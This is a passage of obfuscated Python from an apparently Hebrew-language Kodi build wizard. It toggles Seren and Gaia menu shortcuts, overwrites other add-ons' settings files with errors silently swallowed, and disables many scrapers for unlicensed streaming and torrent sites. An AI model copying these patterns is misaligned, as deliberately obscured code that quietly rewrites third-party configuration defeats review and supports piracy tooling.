		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1377
    with open (O00000OOO0OO0O00O ,'w')as O0000000OO0000O00 :#line:1380
      O0000000OO0000O00 .write (OOO0000O0OO00OO0O )#line:1381
    O00000OOO0OO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1385
    with open (O00000OOO0OO0O00O ,'r')as O0000000OO0000O00 :#line:1386
      OOO0000O0OO00OO0O =O0000000OO0000O00 .read ()#line:1387
    OOO0000O0OO00OO0O =OOO0000O0OO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1405
    with open (O00000OOO0OO0O00O ,'w')as O0000000OO0000O00 :#line:1408
      O0000000OO0000O00 .write (OOO0000O0OO00OO0O )#line:1409
    O00000OOO0OO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1412
    with open (O00000OOO0OO0O00O ,'r')as O0000000OO0000O00 :#line:1413
      OOO0000O0OO00OO0O =O0000000OO0000O00 .read ()#line:1414
    OOO0000O0OO00OO0O =OOO0000O0OO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1432
    with open (O00000OOO0OO0O00O ,'w')as O0000000OO0000O00 :#line:1435
      O0000000OO0000O00 .write (OOO0000O0OO00OO0O )#line:1436
    O00000OOO0OO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1438
    with open (O00000OOO0OO0O00O ,'r')as O0000000OO0000O00 :#line:1439
      OOO0000O0OO00OO0O =O0000000OO0000O00 .read ()#line:1440
    OOO0000O0OO00OO0O =OOO0000O0OO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1458
    with open (O00000OOO0OO0O00O ,'w')as O0000000OO0000O00 :#line:1461
      O0000000OO0000O00 .write (OOO0000O0OO00OO0O )#line:1462
    O00000OOO0OO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1464
    with open (O00000OOO0OO0O00O ,'r')as O0000000OO0000O00 :#line:1465
      OOO0000O0OO00OO0O =O0000000OO0000O00 .read ()#line:1466
    OOO0000O0OO00OO0O =OOO0000O0OO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1484
    with open (O00000OOO0OO0O00O ,'w')as O0000000OO0000O00 :#line:1487
      O0000000OO0000O00 .write (OOO0000O0OO00OO0O )#line:1488
    O00000OOO0OO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1491
    with open (O00000OOO0OO0O00O ,'r')as O0000000OO0000O00 :#line:1492
      OOO0000O0OO00OO0O =O0000000OO0000O00 .read ()#line:1493
    OOO0000O0OO00OO0O =OOO0000O0OO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1511
    with open (O00000OOO0OO0O00O ,'w')as O0000000OO0000O00 :#line:1514
      O0000000OO0000O00 .write (OOO0000O0OO00OO0O )#line:1515
def rdbuildinstalloff ():#line:1518
    try :#line:1519
       O00OOOO00OO00OOO0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1520
       OO000O00O000OO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1521
       copyfile (O00OOOO00OO00OOO0 ,OO000O00O000OO00O )#line:1523
       O00OOOO00OO00OOO0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1525
       OO000O00O000OO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1526
       copyfile (O00OOOO00OO00OOO0 ,OO000O00O000OO00O )#line:1528
       O00OOOO00OO00OOO0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1530
       OO000O00O000OO00O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1531
       copyfile (O00OOOO00OO00OOO0 ,OO000O00O000OO00O )#line:1533
       O00OOOO00OO00OOO0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1536
       OO000O00O000OO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1537
       copyfile (O00OOOO00OO00OOO0 ,OO000O00O000OO00O )#line:1539
    except :#line:1541
       pass #line:1542
def rdbuildaddonON ():#line:1549
    OO0OOO0OO00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1551
    with open (OO0OOO0OO00OOO000 ,'r')as OO0O0OOO00O00O00O :#line:1552
      OO000OOO0O000000O =OO0O0OOO00O00O00O .read ()#line:1553
    OO000OOO0O000000O =OO000OOO0O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1571
    with open (OO0OOO0OO00OOO000 ,'w')as OO0O0OOO00O00O00O :#line:1574
      OO0O0OOO00O00O00O .write (OO000OOO0O000000O )#line:1575
    OO0OOO0OO00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1579
    with open (OO0OOO0OO00OOO000 ,'r')as OO0O0OOO00O00O00O :#line:1580
      OO000OOO0O000000O =OO0O0OOO00O00O00O .read ()#line:1581
    OO000OOO0O000000O =OO000OOO0O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1599
    with open (OO0OOO0OO00OOO000 ,'w')as OO0O0OOO00O00O00O :#line:1602
      OO0O0OOO00O00O00O .write (OO000OOO0O000000O )#line:1603
    OO0OOO0OO00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1607
    with open (OO0OOO0OO00OOO000 ,'r')as OO0O0OOO00O00O00O :#line:1608
      OO000OOO0O000000O =OO0O0OOO00O00O00O .read ()#line:1609
    OO000OOO0O000000O =OO000OOO0O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1627
    with open (OO0OOO0OO00OOO000 ,'w')as OO0O0OOO00O00O00O :#line:1630
      OO0O0OOO00O00O00O .write (OO000OOO0O000000O )#line:1631
    OO0OOO0OO00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1635
    with open (OO0OOO0OO00OOO000 ,'r')as OO0O0OOO00O00O00O :#line:1636
      OO000OOO0O000000O =OO0O0OOO00O00O00O .read ()#line:1637
    OO000OOO0O000000O =OO000OOO0O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1655
    with open (OO0OOO0OO00OOO000 ,'w')as OO0O0OOO00O00O00O :#line:1658
      OO0O0OOO00O00O00O .write (OO000OOO0O000000O )#line:1659
    OO0OOO0OO00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1662
    with open (OO0OOO0OO00OOO000 ,'r')as OO0O0OOO00O00O00O :#line:1663
      OO000OOO0O000000O =OO0O0OOO00O00O00O .read ()#line:1664
    OO000OOO0O000000O =OO000OOO0O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1682
    with open (OO0OOO0OO00OOO000 ,'w')as OO0O0OOO00O00O00O :#line:1685
      OO0O0OOO00O00O00O .write (OO000OOO0O000000O )#line:1686
    OO0OOO0OO00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1688
    with open (OO0OOO0OO00OOO000 ,'r')as OO0O0OOO00O00O00O :#line:1689
      OO000OOO0O000000O =OO0O0OOO00O00O00O .read ()#line:1690
    OO000OOO0O000000O =OO000OOO0O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1708
    with open (OO0OOO0OO00OOO000 ,'w')as OO0O0OOO00O00O00O :#line:1711
      OO0O0OOO00O00O00O .write (OO000OOO0O000000O )#line:1712
    OO0OOO0OO00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1714
    with open (OO0OOO0OO00OOO000 ,'r')as OO0O0OOO00O00O00O :#line:1715
      OO000OOO0O000000O =OO0O0OOO00O00O00O .read ()#line:1716
    OO000OOO0O000000O =OO000OOO0O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1734
    with open (OO0OOO0OO00OOO000 ,'w')as OO0O0OOO00O00O00O :#line:1737
      OO0O0OOO00O00O00O .write (OO000OOO0O000000O )#line:1738
    OO0OOO0OO00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1741
    with open (OO0OOO0OO00OOO000 ,'r')as OO0O0OOO00O00O00O :#line:1742
      OO000OOO0O000000O =OO0O0OOO00O00O00O .read ()#line:1743
    OO000OOO0O000000O =OO000OOO0O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1761
    with open (OO0OOO0OO00OOO000 ,'w')as OO0O0OOO00O00O00O :#line:1764
      OO0O0OOO00O00O00O .write (OO000OOO0O000000O )#line:1765
def rdbuildinstallON ():#line:1768
    try :#line:1770
       OOOOO0OOOO00OO00O =ADDONPATH +"/resources/rd/victory.xml"#line:1771
       OO0O00O0OO0OOO0O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1772
       copyfile (OOOOO0OOOO00OO00O ,OO0O00O0OO0OOO0O0 )#line:1774
       OOOOO0OOOO00OO00O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1776
       OO0O00O0OO0OOO0O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1777
       copyfile (OOOOO0OOOO00OO00O ,OO0O00O0OO0OOO0O0 )#line:1779
       OOOOO0OOOO00OO00O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1781
       OO0O00O0OO0OOO0O0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1782
       copyfile (OOOOO0OOOO00OO00O ,OO0O00O0OO0OOO0O0 )#line:1784
       OOOOO0OOOO00OO00O =ADDONPATH +"/resources/rd/Splash.png"#line:1787
       OO0O00O0OO0OOO0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1788
       copyfile (OOOOO0OOOO00OO00O ,OO0O00O0OO0OOO0O0 )#line:1790
    except :#line:1792
       pass #line:1793
def rdbuild ():#line:1803
	O0OOOO00O0OOOO00O =(ADDON .getSetting ("auto_rd"))#line:1804
	if O0OOOO00O0OOOO00O =='true':#line:1805
		OOO0OO0OOO0000OOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1806
		OOO0OO0OOO0000OOO .setSetting ('all_t','0')#line:1807
		OOO0OO0OOO0000OOO .setSetting ('rd_menu_enable','false')#line:1808
		OOO0OO0OOO0000OOO .setSetting ('magnet_bay','false')#line:1809
		OOO0OO0OOO0000OOO .setSetting ('magnet_extra','false')#line:1810
		OOO0OO0OOO0000OOO .setSetting ('rd_only','false')#line:1811
		OOO0OO0OOO0000OOO .setSetting ('ftp','false')#line:1813
		OOO0OO0OOO0000OOO .setSetting ('fp','false')#line:1814
		OOO0OO0OOO0000OOO .setSetting ('filter_fp','false')#line:1815
		OOO0OO0OOO0000OOO .setSetting ('fp_size_en','false')#line:1816
		OOO0OO0OOO0000OOO .setSetting ('afdah','false')#line:1817
		OOO0OO0OOO0000OOO .setSetting ('ap2s','false')#line:1818
		OOO0OO0OOO0000OOO .setSetting ('cin','false')#line:1819
		OOO0OO0OOO0000OOO .setSetting ('clv','false')#line:1820
		OOO0OO0OOO0000OOO .setSetting ('cmv','false')#line:1821
		OOO0OO0OOO0000OOO .setSetting ('dl20','false')#line:1822
		OOO0OO0OOO0000OOO .setSetting ('esc','false')#line:1823
		OOO0OO0OOO0000OOO .setSetting ('extra','false')#line:1824
		OOO0OO0OOO0000OOO .setSetting ('film','false')#line:1825
		OOO0OO0OOO0000OOO .setSetting ('fre','false')#line:1826
		OOO0OO0OOO0000OOO .setSetting ('fxy','false')#line:1827
		OOO0OO0OOO0000OOO .setSetting ('genv','false')#line:1828
		OOO0OO0OOO0000OOO .setSetting ('getgo','false')#line:1829
		OOO0OO0OOO0000OOO .setSetting ('gold','false')#line:1830
		OOO0OO0OOO0000OOO .setSetting ('gona','false')#line:1831
		OOO0OO0OOO0000OOO .setSetting ('hdmm','false')#line:1832
		OOO0OO0OOO0000OOO .setSetting ('hdt','false')#line:1833
		OOO0OO0OOO0000OOO .setSetting ('icy','false')#line:1834
		OOO0OO0OOO0000OOO .setSetting ('ind','false')#line:1835
		OOO0OO0OOO0000OOO .setSetting ('iwi','false')#line:1836
		OOO0OO0OOO0000OOO .setSetting ('jen_free','false')#line:1837
		OOO0OO0OOO0000OOO .setSetting ('kiss','false')#line:1838
		OOO0OO0OOO0000OOO .setSetting ('lavin','false')#line:1839
		OOO0OO0OOO0000OOO .setSetting ('los','false')#line:1840
		OOO0OO0OOO0000OOO .setSetting ('m4u','false')#line:1841
		OOO0OO0OOO0000OOO .setSetting ('mesh','false')#line:1842
		OOO0OO0OOO0000OOO .setSetting ('mf','false')#line:1843
		OOO0OO0OOO0000OOO .setSetting ('mkvc','false')#line:1844
		OOO0OO0OOO0000OOO .setSetting ('mjy','false')#line:1845
		OOO0OO0OOO0000OOO .setSetting ('hdonline','false')#line:1846
		OOO0OO0OOO0000OOO .setSetting ('moviex','false')#line:1847
		OOO0OO0OOO0000OOO .setSetting ('mpr','false')#line:1848
		OOO0OO0OOO0000OOO .setSetting ('mvg','false')#line:1849
		OOO0OO0OOO0000OOO .setSetting ('mvl','false')#line:1850
		OOO0OO0OOO0000OOO .setSetting ('mvs','false')#line:1851
		OOO0OO0OOO0000OOO .setSetting ('myeg','false')#line:1852
		OOO0OO0OOO0000OOO .setSetting ('ninja','false')#line:1853
		OOO0OO0OOO0000OOO .setSetting ('odb','false')#line:1854
		OOO0OO0OOO0000OOO .setSetting ('ophd','false')#line:1855
		OOO0OO0OOO0000OOO .setSetting ('pks','false')#line:1856
		OOO0OO0OOO0000OOO .setSetting ('prf','false')#line:1857
		OOO0OO0OOO0000OOO .setSetting ('put18','false')#line:1858
		OOO0OO0OOO0000OOO .setSetting ('req','false')#line:1859
		OOO0OO0OOO0000OOO .setSetting ('rftv','false')#line:1860
		OOO0OO0OOO0000OOO .setSetting ('rltv','false')#line:1861
		OOO0OO0OOO0000OOO .setSetting ('sc','false')#line:1862
		OOO0OO0OOO0000OOO .setSetting ('seehd','false')#line:1863
		OOO0OO0OOO0000OOO .setSetting ('showbox','false')#line:1864
		OOO0OO0OOO0000OOO .setSetting ('shuid','false')#line:1865
		OOO0OO0OOO0000OOO .setSetting ('sil_gh','false')#line:1866
		OOO0OO0OOO0000OOO .setSetting ('spv','false')#line:1867
		OOO0OO0OOO0000OOO .setSetting ('subs','false')#line:1868
		OOO0OO0OOO0000OOO .setSetting ('tvs','false')#line:1869
		OOO0OO0OOO0000OOO .setSetting ('tw','false')#line:1870
		OOO0OO0OOO0000OOO .setSetting ('upto','false')#line:1871
		OOO0OO0OOO0000OOO .setSetting ('vel','false')#line:1872
		OOO0OO0OOO0000OOO .setSetting ('vex','false')#line:1873
		OOO0OO0OOO0000OOO .setSetting ('vidc','false')#line:1874
		OOO0OO0OOO0000OOO .setSetting ('w4hd','false')#line:1875
		OOO0OO0OOO0000OOO .setSetting ('wav','false')#line:1876
		OOO0OO0OOO0000OOO .setSetting ('wf','false')#line:1877
		OOO0OO0OOO0000OOO .setSetting ('wse','false')#line:1878
		OOO0OO0OOO0000OOO .setSetting ('wss','false')#line:1879
		OOO0OO0OOO0000OOO .setSetting ('wsse','false')#line:1880
		OOO0OO0OOO0000OOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1881
		OOO0OO0OOO0000OOO .setSetting ('debrid.only','true')#line:1882
		OOO0OO0OOO0000OOO .setSetting ('hosts.captcha','false')#line:1883
		OOO0OO0OOO0000OOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1884
		OOO0OO0OOO0000OOO .setSetting ('provider.123moviehd','false')#line:1885
		OOO0OO0OOO0000OOO .setSetting ('provider.300mbdownload','false')#line:1886
		OOO0OO0OOO0000OOO .setSetting ('provider.alltube','false')#line:1887
		OOO0OO0OOO0000OOO .setSetting ('provider.allucde','false')#line:1888
		OOO0OO0OOO0000OOO .setSetting ('provider.animebase','false')#line:1889
		OOO0OO0OOO0000OOO .setSetting ('provider.animeloads','false')#line:1890
		OOO0OO0OOO0000OOO .setSetting ('provider.animetoon','false')#line:1891
		OOO0OO0OOO0000OOO .setSetting ('provider.bnwmovies','false')#line:1892
		OOO0OO0OOO0000OOO .setSetting ('provider.boxfilm','false')#line:1893
		OOO0OO0OOO0000OOO .setSetting ('provider.bs','false')#line:1894
		OOO0OO0OOO0000OOO .setSetting ('provider.cartoonhd','false')#line:1895
		OOO0OO0OOO0000OOO .setSetting ('provider.cdahd','false')#line:1896
		OOO0OO0OOO0000OOO .setSetting ('provider.cdax','false')#line:1897
		OOO0OO0OOO0000OOO .setSetting ('provider.cine','false')#line:1898
		OOO0OO0OOO0000OOO .setSetting ('provider.cinenator','false')#line:1899
		OOO0OO0OOO0000OOO .setSetting ('provider.cmovieshdbz','false')#line:1900
		OOO0OO0OOO0000OOO .setSetting ('provider.coolmoviezone','false')#line:1901
		OOO0OO0OOO0000OOO .setSetting ('provider.ddl','false')#line:1902
		OOO0OO0OOO0000OOO .setSetting ('provider.deepmovie','false')#line:1903
		OOO0OO0OOO0000OOO .setSetting ('provider.ekinomaniak','false')#line:1904
		OOO0OO0OOO0000OOO .setSetting ('provider.ekinotv','false')#line:1905
		OOO0OO0OOO0000OOO .setSetting ('provider.filiser','false')#line:1906
		OOO0OO0OOO0000OOO .setSetting ('provider.filmpalast','false')#line:1907
		OOO0OO0OOO0000OOO .setSetting ('provider.filmwebbooster','false')#line:1908
		OOO0OO0OOO0000OOO .setSetting ('provider.filmxy','false')#line:1909
		OOO0OO0OOO0000OOO .setSetting ('provider.fmovies','false')#line:1910
		OOO0OO0OOO0000OOO .setSetting ('provider.foxx','false')#line:1911
		OOO0OO0OOO0000OOO .setSetting ('provider.freefmovies','false')#line:1912
		OOO0OO0OOO0000OOO .setSetting ('provider.freeputlocker','false')#line:1913
		OOO0OO0OOO0000OOO .setSetting ('provider.furk','false')#line:1914
		OOO0OO0OOO0000OOO .setSetting ('provider.gamatotv','false')#line:1915
		OOO0OO0OOO0000OOO .setSetting ('provider.gogoanime','false')#line:1916
		OOO0OO0OOO0000OOO .setSetting ('provider.gowatchseries','false')#line:1917
		OOO0OO0OOO0000OOO .setSetting ('provider.hackimdb','false')#line:1918
		OOO0OO0OOO0000OOO .setSetting ('provider.hdfilme','false')#line:1919
		OOO0OO0OOO0000OOO .setSetting ('provider.hdmto','false')#line:1920
		OOO0OO0OOO0000OOO .setSetting ('provider.hdpopcorns','false')#line:1921
		OOO0OO0OOO0000OOO .setSetting ('provider.hdstreams','false')#line:1922
		OOO0OO0OOO0000OOO .setSetting ('provider.horrorkino','false')#line:1924
		OOO0OO0OOO0000OOO .setSetting ('provider.iitv','false')#line:1925
		OOO0OO0OOO0000OOO .setSetting ('provider.iload','false')#line:1926
		OOO0OO0OOO0000OOO .setSetting ('provider.iwaatch','false')#line:1927
		OOO0OO0OOO0000OOO .setSetting ('provider.kinodogs','false')#line:1928
		OOO0OO0OOO0000OOO .setSetting ('provider.kinoking','false')#line:1929
		OOO0OO0OOO0000OOO .setSetting ('provider.kinow','false')#line:1930
		OOO0OO0OOO0000OOO .setSetting ('provider.kinox','false')#line:1931
		OOO0OO0OOO0000OOO .setSetting ('provider.lichtspielhaus','false')#line:1932
		OOO0OO0OOO0000OOO .setSetting ('provider.liomenoi','false')#line:1933
		OOO0OO0OOO0000OOO .setSetting ('provider.magnetdl','false')#line:1936
		OOO0OO0OOO0000OOO .setSetting ('provider.megapelistv','false')#line:1937
		OOO0OO0OOO0000OOO .setSetting ('provider.movie2k-ac','false')#line:1938
		OOO0OO0OOO0000OOO .setSetting ('provider.movie2k-ag','false')#line:1939
		OOO0OO0OOO0000OOO .setSetting ('provider.movie2z','false')#line:1940
		OOO0OO0OOO0000OOO .setSetting ('provider.movie4k','false')#line:1941
		OOO0OO0OOO0000OOO .setSetting ('provider.movie4kis','false')#line:1942
		OOO0OO0OOO0000OOO .setSetting ('provider.movieneo','false')#line:1943
		OOO0OO0OOO0000OOO .setSetting ('provider.moviesever','false')#line:1944
		OOO0OO0OOO0000OOO .setSetting ('provider.movietown','false')#line:1945
		OOO0OO0OOO0000OOO .setSetting ('provider.mvrls','false')#line:1947
		OOO0OO0OOO0000OOO .setSetting ('provider.netzkino','false')#line:1948
		OOO0OO0OOO0000OOO .setSetting ('provider.odb','false')#line:1949
		OOO0OO0OOO0000OOO .setSetting ('provider.openkatalog','false')#line:1950
		OOO0OO0OOO0000OOO .setSetting ('provider.ororo','false')#line:1951
